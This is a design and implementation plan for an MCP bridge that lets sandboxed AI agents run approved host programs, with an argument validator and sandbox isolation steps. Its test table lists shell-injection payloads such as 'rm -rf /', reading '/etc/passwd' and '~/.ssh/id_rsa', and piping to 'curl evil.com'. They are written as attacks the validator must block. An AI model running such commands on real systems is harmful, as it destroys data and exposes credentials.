# Claudey Bridge: Implementation Plan

**Approach:** Test-Driven Development (TDD)  
**Strategy:** Validate risky/uncertain parts first, fail fast if needed

---

## Risk Assessment

### 🔴 HIGH RISK (Validate First)
1. **Sandbox isolation actually works** - Can we prevent escape on both platforms?
2. **Bridge-sandbox communication** - Can sandboxed process reach localhost bridge?
3. **Agent-specific profiles** - Can we selectively mount files (e.g., `~/.gitconfig` but not `~/.ssh/id_rsa`)?

### 🟡 MEDIUM RISK
4. **Input validation prevents injection** - Does character-level validation catch all attacks?
5. **MCP protocol integration** - Does Quarkus MCP server work as expected?

### 🟢 LOW RISK (Standard Engineering)
6. Tool definition parsing (YAML + Markdown)
7. Command execution
8. Packaging and distribution

---

## Design Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| **Arg validation** | Character-level safety only | Scripts handle their own semantic validation |
| **Path expansion** | At startup, `~` → `$HOME` | Predictable, simple |
| **Error format** | Structured text in tool result | Agent can parse and react |
| **Execution safety** | `ProcessBuilder` with arg list | No shell interpretation, defense-in-depth |
| **Hot reload** | Phase 0: No | Restart to reload definitions |
| **Transport** | `quarkus-mcp-server-sse` | Streamable HTTP (MCP standard) |

---

## Phase 0: Bridge MVP with `cco` (1 week)

**Goal:** Prove the MCP Bridge concept using `cco` for immediate isolation.

> [!NOTE]
> `cco` uses host networking by default, meaning MCP servers running on `localhost` are accessible from within the sandbox. No special network configuration is required.

### Step 1: Scaffold Bridge Module

Create `bridge/` Maven module structure:

```
bridge/
├── pom.xml
└── src/
    ├── main/java/org/geekden/mcp/bridge/
    │   ├── BridgeMcpTools.java      # The 3 MCP tools
    │   ├── ToolDefinitionParser.java
    │   ├── ToolDefinition.java      # Model class
    │   ├── SafeArgValidator.java    # Character-level validation
    │   ├── CommandExecutor.java
    │   └── config/
    │       └── BridgeConfig.java
    └── test/java/org/geekden/mcp/bridge/
        ├── SafeArgValidatorTest.java  # TDD start
        ├── ToolDefinitionParserTest.java
        └── CommandExecutorTest.java
```

**Dependencies (pom.xml):**
- `quarkus-mcp-server-sse` - MCP over Streamable HTTP
- `quarkus-arc` - CDI
- `jackson-dataformat-yaml` - YAML parsing
- `quarkus-junit5` - Testing

### Step 2: Implement Models

**`ToolDefinition.java`:**
```java
public record ToolDefinition(
    String name,
    String description,
    String command,           // Path to executable, ~ expanded
    String documentation      // Markdown body for help()
) {}
```

Note: No arg definitions - validation is character-level only.

### Step 3: Implement SafeArgValidator (TDD)

**Test first** - these attacks must be blocked:

| Attack | Example | Blocked by |
|--------|---------|------------|
| Shell injection | `; rm -rf /` | Reject `;` |
| Command substitution | `$(whoami)` | Reject `$`, `(`, `)` |
| Backtick execution | `` `cat /etc/passwd` `` | Reject `` ` `` |
| Pipe | `foo \| curl evil.com` | Reject `\|` |
| Boolean operators | `foo && cat ~/.ssh/id_rsa` | Reject `&` |
| Null byte | `main\x00; evil` | Reject `\0` |
| Newline | `main\nrm -rf` | Reject `\n`, `\r` |

**Implementation:**
```java
@ApplicationScoped
public class SafeArgValidator {
    
    // Characters that could enable shell injection
    private static final String FORBIDDEN = ";|&$`(){}[]<>\\n\\r\\0";
    
    public void validateArgs(List<String> args) throws ValidationException {
        for (String arg : args) {
            for (char c : FORBIDDEN.toCharArray()) {
                if (arg.indexOf(c) >= 0) {
                    throw new ValidationException(
                        "Invalid character in argument: " + describeForbidden(c));
                }
            }
        }
    }
}
```

**Allowed characters:**
- Alphanumeric: `a-z`, `A-Z`, `0-9`
- Path-safe: `.`, `-`, `_`, `/`
- Spaces (for multi-word values)

### Step 4: Implement CommandExecutor

**Key design decisions:**
- Use `ProcessBuilder` with args as list (not shell string) - prevents shell interpretation
- Separate stdout/stderr streams (read in parallel threads)
- Define nested `OutputHandler` interface: `onStdout(line)`, `onStderr(line)`, `onComplete(exitCode)`
- Caller receives output line-by-line via callback

### Step 5: Implement MCP Tools

**Three tools:** `list_programs`, `help`, `execute`

**Key design decisions:**
- Use Quarkus `@Tool` / `@ToolArg` annotations
- For streaming output, use Quarkus MCP `Progress` API to send notifications to client
- Return `Uni<String>` for async execution
- Validation happens before execution via `SafeArgValidator`

### Step 6: cco Integration Test

1. **Build/run `cco` from local checkout:**
   ```bash
   cd ../cco
   # Follow cco's development setup (see cco README)
   ```

2. **Start Bridge and connect:**
   ```bash
   # Terminal 1: Start Bridge (runs on host)
   cd bridge && mvn quarkus:dev
   
   # Terminal 2: Start agent in cco sandbox
   cco --safe
   
   # Inside cco, verify Bridge connectivity
   curl http://localhost:3000/mcp
   ```

3. **End-to-End Test:**
   - Agent calls `execute("echo_test", ["hello"])`
   - Bridge validates (no dangerous characters), executes `/bin/echo hello`
   - Output `hello` returned to agent

> [!IMPORTANT]
> Use `cco --safe` for Phase 0 testing. This hides `$HOME` for stronger isolation while still allowing localhost network access.

---

## Phase 1: Bridge Maturity (2 weeks)

**Goal:** Production-ready Bridge Server.

### 1. Tool Definition Parser
- Watch `~/.config/claudey/tools/` for `.md` files
- Parse YAML frontmatter (between `---` delimiters)
- Extract: `name`, `description`, `command`
- Parse markdown body as documentation
- Expand `~` in `command` paths at load time
- Validate required fields at startup (fail fast)

### 2. Security Hardening
- **Audit logging:** Log to `~/.local/share/claudey/audit.log`
  - Timestamp, program, args, exit code
- **Execution timeouts:** Configurable, default 300s
- **Path validation:** If `command` contains `..`, reject

### 3. Error Messages
Structured, actionable errors:
- `"Invalid character in argument: semicolon (;) not allowed"`
- `"Command failed (exit 1): <stderr>"`
- `"Program 'foo' not found. Available: deploy_prod, restart_db"`

### 4. Distribution (Bridge Only)
- Native binary build via GraalVM
- Homebrew formula for `claudey-bridge`
- See [agent-isolation-distribution.md](./agent-isolation-distribution.md) for packaging details

---

## Phase 2: Native Sandbox Launcher (Future)

**Goal:** Build minimal native `cs` launcher to replace `cco` dependency.

> [!NOTE]
> Phase 2 scope is intentionally minimal. No Docker fallback. Focus on parity with `cco --safe` behavior only.

### Scope: What We Build
1. **Linux Launcher:** `bubblewrap` wrapper
   - Hide `$HOME` except workspace and whitelisted paths
   - Preserve localhost network access
   - Match `cco --safe` isolation behavior

2. **macOS Launcher:** `sandbox-exec` wrapper
   - Seatbelt profile blocking `$HOME` except workspace
   - Allow localhost network
   - Match `cco --safe` isolation behavior

3. **Integration:**
   - Replace `cco` in user workflow with `cs`
   - Single installable package (`brew install claudey-bridge` includes both)

### Out of Scope for Phase 2
- Docker fallback (never)
- Agent profile management (defer to later)
- Complex mount configuration (use `cco` if needed)

---

## Testing Strategy

### Phase 0/1 Testing
- **Isolation Testing:** Rely on `cco`'s existing guarantees
  - Manual verification: `cco --safe bash -c "cat ~/.ssh/id_rsa"` should fail
  - Manual verification: `cco --safe bash -c "curl localhost:3000"` should succeed
- **Bridge Testing:** Focus on `SafeArgValidator` and MCP protocol
  - See [agent-isolation-testing.md](./agent-isolation-testing.md) for comprehensive test cases

### Phase 2 Testing
- **Isolation Verification:** Critical when we build our own launcher
  - Test escape vectors (symlinks, /proc access, etc.)
  - Test filesystem visibility (sensitive paths blocked)
  - Test network access (localhost allowed, external blocked if desired)

---

## Cross-References

| Topic | Document |
|-------|----------|
| Product overview & UX | [SPECIFICATION.md](./SPECIFICATION.md) |
| Architecture & module structure | [agent-isolation-architecture.md](./agent-isolation-architecture.md) |
| Distribution & packaging | [agent-isolation-distribution.md](./agent-isolation-distribution.md) |
| Testing strategy (detailed) | [agent-isolation-testing.md](./agent-isolation-testing.md) |
| SSH-based alternative (deprecated) | [agent-isolation-ssh.md](./agent-isolation-ssh.md) |

---

## Next Steps

1. **Verify `cco` works** from your local checkout:
   ```bash
   cd ../cco
   # Build and run per cco's README, then test:
   ./cco --safe bash -c "echo 'Sandbox working!'"
   ```

2. **Scaffold `bridge/` Maven module** in the repo

3. **Write `SafeArgValidator` tests** (TDD start) - see test cases in [agent-isolation-testing.md](./agent-isolation-testing.md)
